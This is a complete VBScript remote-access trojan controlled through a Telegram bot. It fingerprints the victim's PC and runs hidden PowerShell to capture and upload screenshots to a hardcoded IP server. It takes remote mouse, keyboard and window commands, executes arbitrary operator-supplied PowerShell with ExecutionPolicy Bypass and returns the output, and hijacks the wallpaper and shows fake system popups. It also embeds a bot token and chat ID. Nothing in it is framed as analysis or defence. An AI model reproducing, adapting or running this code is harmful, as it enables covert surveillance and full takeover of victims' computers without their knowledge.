Option Explicit

Dim FSO_Lock, LockFile, LockStream, Dir_Lock
Set FSO_Lock = CreateObject("Scripting.FileSystemObject")
Dir_Lock = FSO_Lock.GetParentFolderName(WScript.ScriptFullName)
LockFile = FSO_Lock.BuildPath(Dir_Lock, "script.main.lock")

On Error Resume Next
Set LockStream = FSO_Lock.OpenTextFile(LockFile, 8, True)

If Err.Number <> 0 Then
    WScript.Quit
End If
On Error GoTo 0

Function GetComputerID()
    Dim strComputer, objWMIService, colItems, objItem, serial, i, hash
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    
    Set colItems = objWMIService.ExecQuery("Select SerialNumber from Win32_BaseBoard")
    
    serial = ""
    For Each objItem in colItems
        serial = objItem.SerialNumber
    Next
    
    If Trim(serial) = "" Or LCase(serial) = "to be filled by o.e.m." Then
        Set colItems = objWMIService.ExecQuery("Select UUID from Win32_ComputerSystemProduct")
        For Each objItem in colItems
            serial = objItem.UUID
        Next
    End If

    hash = 0
    For i = 1 To Len(serial)
        hash = (hash + Asc(Mid(serial, i, 1)) * i) Mod 90000
    Next
    
    GetComputerID = CStr(hash + 10000)
End Function

Dim StreamUrl, StreamActive, BotToken, MyID, LoopFile, ManualFile, ClickUrl, ScreenFile, SupportInterval
BotToken   = "7743325672:AAEgT4v4dYlMb3C_JJ9HJP38BYyc-z-3XnA"
MyID       = "7048297998"
LoopFile   = "mex.jpg"
ManualFile = "123.jpg"
ScreenFile = "scrin.png"
SupportInterval = 5000
StreamUrl = "http://144.31.168.56:5200/upload"
StreamActive = False
ClickUrl = "http://144.31.168.56:5200/get_click"

Dim Wsh, FSO, Dir, PathLoop, PathMan, PathScr, Http, LastID, Active
Set Wsh  = CreateObject("WScript.Shell")
Set FSO  = CreateObject("Scripting.FileSystemObject")

Dir      = FSO.GetParentFolderName(WScript.ScriptFullName)
PathLoop = FSO.BuildPath(Dir, LoopFile)
PathMan  = FSO.BuildPath(Dir, ManualFile)
PathScr  = FSO.BuildPath(Dir, ScreenFile)

Active = False
LastID = 0

If FSO.FileExists(Dir & "\stream.lock") Then 
    On Error Resume Next
    FSO.DeleteFile Dir & "\stream.lock", True
    On Error GoTo 0
End If

If Not FSO.FileExists(PathLoop) Then
    Download "https://img2.akspic.ru/crops/2/7/3/1/8/181372/181372-fraktalnoe_iskusstvo-abstraktnoe_iskusstvo-art-tekstura-gde_nikto_ne_znaet-3840x2160.jpg", PathLoop
End If

Dim ComputerID
ComputerID = GetComputerID()
Reply "System Started. PC ID: " & ComputerID & " is now Online."

Do
    UpdateTelegram
    
    If StreamActive Then 
        CheckRemoteClicks
    End If
    
    If Active Then
        SetWallpaper PathLoop
        WScript.Sleep SupportInterval
    Else 
        WScript.Sleep 500 
    End If
Loop

Sub StartFastStream()
    On Error Resume Next
    Dim ps, q, lockFile
    q = Chr(34)
    lockFile = Dir & "\stream.lock"
    FSO.CreateTextFile lockFile, True

    ps = "& { Add-Type -TypeDefinition '[DllImport(""user32.dll"")] public static extern bool SetProcessDPIAware();'; " & _
         "[Win.DPI]::SetProcessDPIAware(); " & _
         "Add-Type -AssemblyName System.Windows.Forms, System.Drawing; " & _
         "$wc = New-Object System.Net.WebClient; " & _
         "while(Test-Path '" & lockFile & "') { " & _
         "  try { " & _
         "    $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " & _
         "    $b = New-Object System.Drawing.Bitmap($s.Width, $s.Height); " & _
         "    $g = [System.Drawing.Graphics]::FromImage($b); " & _
         "    $g.CopyFromScreen(0,0,0,0, $b.Size); " & _
         "    $sc = New-Object System.Drawing.Bitmap([int]($s.Width/2), [int]($s.Height/2)); " & _
         "    $sg = [System.Drawing.Graphics]::FromImage($sc); " & _
         "    $sg.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::Low; " & _
         "    $sg.DrawImage($b, 0, 0, $sc.Width, $sc.Height); " & _
         "    $m = New-Object System.IO.MemoryStream; " & _
         "    $sc.Save($m, [System.Drawing.Imaging.ImageFormat]::Jpeg); " & _
         "    $wc.UploadData('" & StreamUrl & "', 'POST', $m.ToArray()); " & _
         "    $m.Dispose(); $sg.Dispose(); $sc.Dispose(); $g.Dispose(); $b.Dispose(); " & _
         "  } catch {} " & _
         "  Start-Sleep -Milliseconds 500 " & _ 
         "} }"

    Wsh.Run "powershell -WindowStyle Hidden -Command " & q & ps & q, 0, False
End Sub

Sub UpdateTelegram()
    On Error Resume Next
    Dim Resp, Msg, FId, FPath, DUrl, Parts, CmdText, StartPos, EndPos, LMsg
    
    Set Http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Http.Open "GET", "https://api.telegram.org/bot" & BotToken & "/getUpdates?offset=" & (LastID + 1) & "&timeout=10", False
    Http.Send
    
    If Err.Number <> 0 Then Exit Sub
    Resp = Http.ResponseText

    If InStr(Resp, """update_id"":") > 0 Then
        LastID = CLng(Split(Split(Resp, """update_id"":")(1), ",")(0))
        
        If InStr(Resp, """id"":" & MyID) > 0 Then
            If InStr(Resp, """photo"":") > 0 Then
                Parts = Split(Resp, """file_id"":""")
                If UBound(Parts) > 0 Then
                    FId = Split(Parts(UBound(Parts)), """")(0)
                    Http.Open "GET", "https://api.telegram.org/bot" & BotToken & "/getFile?file_id=" & FId, False
                    Http.Send 
                    If InStr(Http.ResponseText, """file_path"":""") > 0 Then
                        FPath = Split(Split(Http.ResponseText, """file_path"":""")(1), """")(0)
                        DUrl = "https://api.telegram.org/file/bot" & BotToken & "/" & FPath
                        If FSO.FileExists(PathMan) Then FSO.DeleteFile PathMan, True 
                        Download DUrl, PathMan
                        Active = False
                        Reply "Photo received. Applying..."
                        ForceApply PathMan, 200, 25 
                        SetWallpaper PathMan
                    End If
                End If
            ElseIf InStr(Resp, """text"":""") > 0 Then
                StartPos = InStr(Resp, """text"":""") + 8
                EndPos = InStr(StartPos, Resp, """,""")
                If EndPos = 0 Then EndPos = InStr(StartPos, Resp, """}")
                Msg = UnescapeUnicode(Mid(Resp, StartPos, EndPos - StartPos))
                LMsg = LCase(Trim(Msg))

                If LMsg = "/name" Then
                    TakeScreenshot False
                    Reply "PC Online. My ID: " & ComputerID
                Else
                    Dim SpacePos, TargetID, ActualCmd
                    SpacePos = InStr(LMsg, " ")
                    If SpacePos > 0 Then
                        TargetID = Left(LMsg, SpacePos - 1)
                        If TargetID = ComputerID Then
                            ActualCmd = Mid(LMsg, SpacePos + 1)
                            HandleCommand ActualCmd, Msg
                        End If
                    End If
                End If
            End If
        End If
    End If
End Sub

Sub HandleCommand(LMsg, Msg)
    On Error Resume Next
    If LMsg = "/start" Then
        Active = True
        Reply "Started."
        ForceApply PathLoop, 200, 25
    ElseIf LMsg = "/vnc_on" Then
        If Not StreamActive Then
            StreamActive = True
            StartFastStream
            Reply "VNC start"
        Else
            Reply "VNC work"
        End If
    ElseIf LMsg = "/vnc_off" Then
        StreamActive = False
        If FSO.FileExists(Dir & "\stream.lock") Then FSO.DeleteFile Dir & "\stream.lock", True
        Reply "VNC Stoped"
    ElseIf LMsg = "/help" Then
        Dim HelpText
        HelpText = "Spisok komand:" & vbCrLf & _
                               "/start - Zapusk oboev" & vbCrLf & _
                               "/stop - Stop Oboev" & vbCrLf & _
                               "/scr - Screenshot" & vbCrLf & _
                               "/scrs - screen setka" & vbCrLf & _
                               "/rem - svernut vse okna" & vbCrLf & _
                               "/click X Y - Klik LKM" & vbCrLf & _
                               "/rclick X Y - Klik PKM" & vbCrLf & _
                               "/dclick X Y - Dublklik" & vbCrLf & _
                               "/type Текст - Text" & vbCrLf & _
                               "/key klavisha" & vbCrLf & _
                               "/paste - paste with buffer" & vbCrLf & _
                               "/scru N - prokrutit up N" & vbCrLf & _
                               "/scrd N - prokrutit down N" & vbCrLf & _
                               "/win - spisok okon" & vbCrLf & _
                               "/op name - Razvernut okno" & vbCrLf & _
                               "/re name - Svernut okno" & vbCrLf & _
                               "/f4 name - Zakrit okno" & vbCrLf & _
                               "/com command in CMD or Powershel" & vbCrLf & _
                               "http... - photo on the Fon"& vbCrLf & _
                               "/vnc_on /vnc_off - demka"& vbCrLf & _
                               "/name - spisok pk"& vbCrLf & _
                               "/sound text - govorit"
        Reply HelpText
    ElseIf LMsg = "/stop" Then
        Active = False
        Reply "Stopped."
    ElseIf LMsg = "/scr" Then
        TakeScreenshot False
    ElseIf LMsg = "/scrs" Then
        TakeScreenshot True
    ElseIf LMsg = "/rem" Then
        MinimizeAllWindows
    ElseIf LMsg = "/paste" Then
        Wsh.Run "powershell -WindowStyle Hidden -Command ""$sig = '[DllImport(\""user32.dll\"")] public static extern IntPtr LoadKeyboardLayout(string p, uint f);'; $type = Add-Type -MemberDefinition $sig -Name 'W' -Namespace 'W' -PassThru; $type::LoadKeyboardLayout('00000409', 1); (New-Object -ComObject WScript.Shell).SendKeys('^v')""", 0, True
        Reply "Pasted."
    ElseIf Left(LMsg, 6) = "/click" Then
        MouseAction "left", Mid(Msg, InStr(Msg, "/click") + 7)
        WScript.Sleep 400
        TakeScreenshot False
    ElseIf Left(LMsg, 7) = "/rclick" Then
        MouseAction "right", Mid(Msg, InStr(Msg, "/rclick") + 8)
        WScript.Sleep 400
        TakeScreenshot False
    ElseIf Left(LMsg, 7) = "/dclick" Then
        MouseAction "double", Mid(Msg, InStr(Msg, "/dclick") + 8)
        WScript.Sleep 400
        TakeScreenshot False
    ElseIf Left(LMsg, 5) = "/type" Then
        TypeAndPaste Mid(Msg, InStr(Msg, "/type") + 6)
        Reply "Text typed."
    ElseIf Left(LMsg, 4) = "/key" Then
        Wsh.SendKeys Mid(Msg, InStr(Msg, "/key") + 5)
        Reply "Key sent."
    ElseIf Left(LMsg, 5) = "/scru" Then
        Dim ScrollUpCount : ScrollUpCount = 1
        If Len(LMsg) > 6 Then ScrollUpCount = CInt(Trim(Mid(LMsg, 7)))
        MouseWheel "up", ScrollUpCount
        TakeScreenshot False
    ElseIf Left(LMsg, 5) = "/scrd" Then
        Dim ScrollDownCount : ScrollDownCount = 1
        If Len(LMsg) > 6 Then ScrollDownCount = CInt(Trim(Mid(LMsg, 7)))
        MouseWheel "down", ScrollDownCount
        TakeScreenshot False
    ElseIf LMsg = "/win" Then
        GetWindowsList
    ElseIf Left(LMsg, 3) = "/op" Then
        ManageWindow "open", Mid(Msg, InStr(Msg, "/op") + 4)
    ElseIf Left(LMsg, 3) = "/re" Then
        ManageWindow "min", Mid(Msg, InStr(Msg, "/re") + 4)
    ElseIf Left(LMsg, 3) = "/f4" Then
        ManageWindow "close", Mid(Msg, InStr(Msg, "/f4") + 4) 
    ElseIf Left(LMsg, 6) = "/sound" Then
        Dim speechText, psSpeech
        speechText = Mid(Msg, InStr(Msg, "/sound") + 7)
        
        If Trim(speechText) <> "" Then
            psSpeech = "Add-Type -AssemblyName System.Speech; " & _
                       "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; " & _
                       "$s.Speak('" & Replace(speechText, "'", "''") & "')"
            
            RunCommandAndReply psSpeech
        End If
    ElseIf Left(LMsg, 5) = "/nots" Then
        ShowStrictNotification Mid(Msg, InStr(Msg, "/nots") + 6)
        Reply "Attempting to show strict notification..."
    ElseIf Left(LMsg, 4) = "/com" Then
        RunCommandAndReply Mid(Msg, InStr(Msg, "/com") + 5) 
    ElseIf Left(LMsg, 4) = "http" Then
        If FSO.FileExists(PathLoop) Then FSO.DeleteFile PathLoop, True
        Download Msg, PathLoop
        Reply "mex.jpg updated." 
    End If
End Sub

Sub TypeAndPaste(rawText)
    On Error Resume Next
    Dim psCmd, clean
    clean = Replace(rawText, "'", "''")
    psCmd = "powershell -WindowStyle Hidden -Command ""$sig = '[DllImport(\""user32.dll\"")] public static extern IntPtr LoadKeyboardLayout(string p, uint f);'; $type = Add-Type -MemberDefinition $sig -Name 'W' -Namespace 'W' -PassThru; $type::LoadKeyboardLayout('00000409', 1); $t = [Regex]::Unescape('" & clean & "'); Set-Clipboard -Value $t; Start-Sleep -m 400; (New-Object -ComObject WScript.Shell).SendKeys('^v')"""
    Wsh.Run psCmd, 0, True
End Sub

Sub MouseAction(mode, coords)
    On Error Resume Next
    Dim xy, x, y, psCmd, mouseEvent
    xy = Split(Trim(coords), " ")
    x = xy(0) : y = xy(1)
    Select Case mode
        Case "left"   : mouseEvent = "[Mouse]::mouse_event(0x0002,0,0,0,0); [Mouse]::mouse_event(0x0004,0,0,0,0);"
        Case "right"  : mouseEvent = "[Mouse]::mouse_event(0x0008,0,0,0,0); [Mouse]::mouse_event(0x0010,0,0,0,0);"
        Case "double" : mouseEvent = "[Mouse]::mouse_event(0x0002,0,0,0,0); [Mouse]::mouse_event(0x0004,0,0,0,0); [Mouse]::mouse_event(0x0002,0,0,0,0); [Mouse]::mouse_event(0x0004,0,0,0,0);"
    End Select
    psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Mouse { [DllImport(\""user32.dll\"")] public static extern void mouse_event(int f, int x, int y, int d, int e); }'; [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(" & x & "," & y & "); " & mouseEvent & """"
    Wsh.Run psCmd, 0, True
End Sub

Sub TakeScreenshot(drawGrid)
    On Error Resume Next
    Dim psCmd, gridCode
    If FSO.FileExists(PathScr) Then FSO.DeleteFile PathScr, True
    gridCode = ""
    If drawGrid Then
        gridCode = "$pen = New-Object System.Drawing.Pen([System.Drawing.Color]::Red, 1); $font = New-Object System.Drawing.Font('Arial', 9); for($x=100; $x -lt $b.Width; $x+=100){ if($x % 500 -eq 0){ $pen.Width = 3 } else { $pen.Width = 1 }; $g.DrawLine($pen, $x, 0, $x, $b.Height); $g.DrawString($x.ToString(), $font, [System.Drawing.Brushes]::Red, $x, 5); } for($y=100; $y -lt $b.Height; $y+=100){ if($y % 500 -eq 0){ $pen.Width = 3 } else { $pen.Width = 1 }; $g.DrawLine($pen, 0, $y, $b.Width, $y); $g.DrawString($y.ToString(), $font, [System.Drawing.Brushes]::Red, 5, $y); }"
    End If
    psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -AssemblyName System.Windows.Forms, System.Drawing; $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $p = New-Object System.Drawing.Bitmap($b.Width, $b.Height); $g = [System.Drawing.Graphics]::FromImage($p); $g.CopyFromScreen(0,0,0,0,$p.Size); " & gridCode & " $p.Save('" & PathScr & "', [System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $p.Dispose();"""
    Wsh.Run psCmd, 0, True
    If FSO.FileExists(PathScr) Then
        Wsh.Run "cmd /c curl -s -X POST ""https://api.telegram.org/bot" & BotToken & "/sendDocument"" -F ""chat_id=" & MyID & """ -F ""document=@" & PathScr & """", 0, True
        FSO.DeleteFile PathScr, True
    End If
End Sub

Sub RunCommandAndReply(UserCmd)
    On Error Resume Next
    Dim TempFile, ScriptFile, ExecStr, OutText, FSO_Cmd, Stream
    Set FSO_Cmd = CreateObject("Scripting.FileSystemObject")
    
    TempFile = FSO_Cmd.BuildPath(Dir, "out.txt")
    ScriptFile = FSO_Cmd.BuildPath(Dir, "temp_run.ps1")

    If FSO_Cmd.FileExists(TempFile) Then FSO_Cmd.DeleteFile TempFile, True
    If FSO_Cmd.FileExists(ScriptFile) Then FSO_Cmd.DeleteFile ScriptFile, True

    Set Stream = CreateObject("ADODB.Stream")
    Stream.Open : Stream.Type = 2 : Stream.Charset = "utf-8"
    Stream.WriteText UserCmd
    Stream.SaveToFile ScriptFile, 2 : Stream.Close

    ExecStr = "cmd.exe /c ""chcp 65001 > nul && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ScriptFile & """ > """ & TempFile & """ 2>&1"""
    Wsh.Run ExecStr, 0, True

    If FSO_Cmd.FileExists(TempFile) Then
        Set Stream = CreateObject("ADODB.Stream")
        Stream.Open : Stream.Charset = "utf-8" : Stream.LoadFromFile TempFile
        OutText = Stream.ReadText : Stream.Close
        
        FSO_Cmd.DeleteFile TempFile, True
        FSO_Cmd.DeleteFile ScriptFile, True
        
        If Trim(OutText) = "" Then OutText = "okey."
        
        Reply "result:" & vbCrLf & OutText
    Else
        If FSO_Cmd.FileExists(ScriptFile) Then FSO_Cmd.DeleteFile ScriptFile, True
        Reply "Error."
    End If
End Sub

Sub MinimizeAllWindows()
    On Error Resume Next
    CreateObject("Shell.Application").MinimizeAll
End Sub

Sub ForceApply(ImgPath, Count, Interval)
    Dim i
    For i = 1 To Count
        SetWallpaper ImgPath
        WScript.Sleep Interval
    Next
End Sub

Sub SetWallpaper(ImgPath)
    On Error Resume Next
    If Not FSO.FileExists(ImgPath) Then Exit Sub
    Wsh.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", ImgPath, "REG_SZ"
    Wsh.RegWrite "HKCU\Control Panel\Desktop\WallpaperStyle", "10", "REG_SZ"
    Wsh.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 0, False
End Sub

Sub Download(URL, Path)
    On Error Resume Next
    Dim xHttp, Stream
    Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xHttp.Open "GET", URL, False
    xHttp.Send
    Set Stream = CreateObject("ADODB.Stream")
    Stream.Open : Stream.Type = 1 : Stream.Write xHttp.ResponseBody : Stream.SaveToFile Path, 2 : Stream.Close
End Sub

Sub MouseWheel(direction, times)
    On Error Resume Next
    Dim psCmd, delta
    If direction = "up" Then delta = 120 Else delta = -120
    
    If Not IsNumeric(times) Then times = 1

    psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -TypeDefinition 'using System; " & _
            "using System.Runtime.InteropServices; public class Mouse { " & _
            "[DllImport(\""user32.dll\"")] public static extern void mouse_event(int f, int x, int y, int d, int e); " & _
            "}'; for($i=0; $i -lt " & times & "; $i++) { [Mouse]::mouse_event(0x0800, 0, 0, " & delta & ", 0); Start-Sleep -m 50 }"""
    
    Wsh.Run psCmd, 0, True
End Sub

Sub GetWindowsList()
    On Error Resume Next
    Dim psCmd, TempFile, OutText
    TempFile = FSO.BuildPath(Dir, "win.txt")
    psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; " & _
            "public class W { [DllImport(\""user32.dll\"")] public static extern bool IsIconic(IntPtr h); " & _
            "[DllImport(\""user32.dll\"")] public static extern bool IsWindowVisible(IntPtr h); }'; " & _
            "$res = Get-Process | Where-Object { $_.MainWindowTitle -and $_.MainWindowHandle -ne 0 } | ForEach-Object { " & _
            "if([W]::IsWindowVisible($_.MainWindowHandle)) { " & _
            "$s = if([W]::IsIconic($_.MainWindowHandle)) {'min'} else {'open'}; " & _
            "$_.ProcessName + ' ' + $s + ' (' + $_.MainWindowTitle + ')' } }; " & _
            "$res | Out-File -FilePath '" & TempFile & "' -Encoding utf8"""
            
    Wsh.Run psCmd, 0, True
    
    If FSO.FileExists(TempFile) Then
        Dim Stream : Set Stream = CreateObject("ADODB.Stream")
        Stream.Open : Stream.Charset = "utf-8" : Stream.LoadFromFile TempFile
        OutText = Stream.ReadText : Stream.Close
        FSO.DeleteFile TempFile, True
        
        OutText = Replace(OutText, ChrW(8206), "")
        Reply "Windows:" & vbCrLf & OutText
    End If
End Sub

Sub ManageWindow(action, procName)
    On Error Resume Next
    Dim psCmd, showCmd, cleanProc
    cleanProc = Trim(procName)
    
    Select Case action
        Case "open"  : showCmd = "9" 
        Case "min"   : showCmd = "6"
        Case "close" : showCmd = "kill"
    End Select
    
    If showCmd = "kill" Then
        psCmd = "powershell -WindowStyle Hidden -Command ""Stop-Process -Name '" & cleanProc & "' -Force -ErrorAction SilentlyContinue"""
    Else
        psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; " & _
                "public class W { [DllImport(\""user32.dll\"")] public static extern bool ShowWindow(IntPtr h, int c); " & _
                "[DllImport(\""user32.dll\"")] public static extern bool SetForegroundWindow(IntPtr h); }'; " & _
                "$p = Get-Process -Name '" & cleanProc & "' -ErrorAction SilentlyContinue; " & _
                "foreach($i in $p) { [W]::ShowWindow($i.MainWindowHandle, " & showCmd & "); [W]::SetForegroundWindow($i.MainWindowHandle); }"""
    End If
    
    Wsh.Run psCmd, 0, True
    Reply "comand " & action & " send to: " & cleanProc
End Sub

Sub Reply(Txt)
    On Error Resume Next
    Dim CleanTxt : CleanTxt = Txt
    CleanTxt = Replace(CleanTxt, ChrW(8206), "") 
    CleanTxt = Replace(CleanTxt, "%", "%25") : CleanTxt = Replace(CleanTxt, " ", "%20")
    CleanTxt = Replace(CleanTxt, "&", "%26") : CleanTxt = Replace(CleanTxt, vbCrLf, "%0A")
    Wsh.Run "cmd /c curl -s ""https://api.telegram.org/bot" & BotToken & "/sendMessage?chat_id=" & MyID & "&text=" & CleanTxt & """", 0, False
End Sub

Sub CheckRemoteClicks()
    On Error Resume Next
    Dim Http, Resp, coords, xPct, yPct, width, height, targetX, targetY
    
    Set Http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Http.Open "GET", ClickUrl, False
    Http.Send
    
    If Http.Status = 200 Then
        Resp = Http.ResponseText
        If Resp <> "" Then
            coords = Split(Resp, " ")
            If coords(0) = "CMD" Then
                Dim fullCmd
                fullCmd = Mid(Resp, 5) 
                
                If Left(fullCmd, 4) = "/key" Then
                    Dim keyToSend
                    keyToSend = Mid(fullCmd, 6)
                    If keyToSend = "WINR" Then
                        Wsh.Run "powershell -command ""(New-Object -ComObject Shell.Application).FileRun()""", 0, False
                    Else
                        Wsh.SendKeys keyToSend
                    End If
                ElseIf fullCmd = "/rem" Then
                    MinimizeAllWindows
                End If
                Exit Sub
            End If

            xPct = CDbl(Replace(coords(0), ".", ","))
            yPct = CDbl(Replace(coords(1), ".", ","))

            Dim wmi, monitor
            Set wmi = GetObject("winmgmts:\\.\root\cimv2")
            For Each monitor In wmi.ExecQuery("Select * from Win32_VideoController")
                width = monitor.CurrentHorizontalResolution
                height = monitor.CurrentVerticalResolution
            Next

            targetX = Int(xPct * width)
            targetY = Int(yPct * height)
            
            MouseAction "left", targetX & " " & targetY
        End If
    End If
End Sub

Sub TakeScreenshotLowQuality(MyIDNum)
    TakeScreenshot False
    Reply "PC ID: " & MyIDNum & " online."
End Sub

Function UnescapeUnicode(str)
    Dim objRegExp, objMatch, colMatches, retStr
    retStr = str
    Set objRegExp = New RegExp
    objRegExp.Pattern = "\\u([0-9a-fA-F]{4})"
    objRegExp.Global = True
    Set colMatches = objRegExp.Execute(str)
    For Each objMatch In colMatches
        retStr = Replace(retStr, objMatch.Value, ChrW("&H" & objMatch.SubMatches(0)))
    Next
    UnescapeUnicode = retStr
End Function

Sub ShowStrictNotification(txt)
    On Error Resume Next
    Dim b64, psCmd
    ' Превращаем текст в Base64, чтобы обойти проблемы с кодировкой UTF-8/ANSI
    b64 = ToBase64(txt)
    
    ' Вызываем системное окно через PowerShell
    ' Параметры Popup: текст, время ожидания (0 - вечно), заголовок, тип (16 - ошибка + 4096 - поверх всех)
    psCmd = "powershell -WindowStyle Hidden -Command ""$t = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('" & b64 & "')); " & _
            "(New-Object -ComObject WScript.Shell).Popup($t, 0, 'SYSTEM MESSAGE', 16 + 4096)"""
    
    Wsh.Run psCmd, 0, False
End Sub

Function ToBase64(text)
    Dim xml, node
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.CreateElement("base64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = StringToBinary(text)
    ToBase64 = Replace(node.text, vbLf, "")
End Function

Function StringToBinary(text)
  Dim stm
  Set stm = CreateObject("ADODB.Stream")
  stm.Type = 2 
  stm.Charset = "unicode"
  stm.Open
  stm.WriteText text
  stm.Position = 0
  stm.Type = 1 
  StringToBinary = stm.Read
  stm.Close
End Function
